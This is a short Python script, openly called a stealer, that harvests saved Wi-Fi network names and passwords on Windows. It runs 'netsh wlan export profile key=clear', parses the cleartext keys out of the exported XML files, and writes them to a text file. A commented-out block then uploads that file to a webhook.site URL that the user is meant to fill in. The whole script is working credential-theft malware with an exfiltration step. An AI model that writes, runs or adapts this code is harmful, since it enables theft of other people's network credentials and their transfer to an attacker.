from distutils.cmd import Command
from importlib.resources import path
import os
import subprocess
import sys
import requests

"""
# Stealer url
url = "# Replcae this part with the webhook.site url add the url within the "" #"
"""
# Create a file
password_file = open("passwords.txt", "w")
password_file.write("Hello user !! Here are ur passwords")
password_file.close()


# list
wifi_files = []
wifi_name = []
wifi_password = []

# use python to execute windows command
command = subprocess.run(
    ["netsh", "wlan", "export", "profile", "key = clear"], capture_output=True
).stdout.decode()

# Grab current directory
path = os.getcwd()


# Let the hacking begin

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, "r") as f:
                for line in f.readlines():
                    if "name" in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if "KeyMaterial" in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x, y in zip(wifi_name, wifi_password):
                            sys.stdout = open("passwords.txt", "a")
                            print("SSID: " + x, "Password:" + y, sep="\n")
                            sys.stdout.close()
"""
# Let the stealing begin
with open("passwords.txt", "rb") as f:
    r = requests.post(url, data=f)
    # rb is read only in binary
"""
